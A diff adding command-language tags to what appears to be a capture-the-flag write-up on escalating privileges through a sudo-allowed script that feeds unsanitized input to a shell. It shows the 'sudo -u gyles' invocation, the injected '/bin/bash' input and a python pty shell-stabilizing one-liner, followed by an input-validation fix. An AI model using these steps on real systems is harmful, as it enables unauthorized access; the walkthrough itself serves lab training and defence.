@@ -12,6 +12,7 @@ A sudo-allowed script reads user input and passes it unsanitized to a shell comm
 
 ## How It Works
 
+<!-- cmd: linux -->
 ```bash
 # Vulnerable pattern in admin_checks
 read -p "Enter date: " date
@@ -23,12 +24,14 @@ When the script runs as `gyles` and prompts for a date string, entering `/bin/ba
 ## Steps
 
 ### 1. Enumerate sudo rights
+<!-- cmd: linux -->
 ```bash
 sudo -l
 # (gyles) NOPASSWD: /home/gyles/admin_checks
 ```
 
 ### 2. Inspect the script
+<!-- cmd: linux -->
 ```bash
 cat /home/gyles/admin_checks
 ```
@@ -36,6 +39,7 @@ cat /home/gyles/admin_checks
 Look for `read` calls or any variable that flows into a command without sanitization.
 
 ### 3. Run the script and inject
+<!-- cmd: linux -->
 ```bash
 sudo -u gyles /home/gyles/admin_checks
 ```
@@ -46,6 +50,7 @@ When prompted for the date (or any input field), enter:
 ```
 
 ### 4. Stabilize
+<!-- cmd: linux -->
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
@@ -63,6 +68,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ## Defensive Note
 
 Always quote variables in shell scripts and validate input against an allowlist:
+<!-- cmd: linux -->
 ```bash
 if [[ ! "$date" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]]; then
     echo "Invalid date"
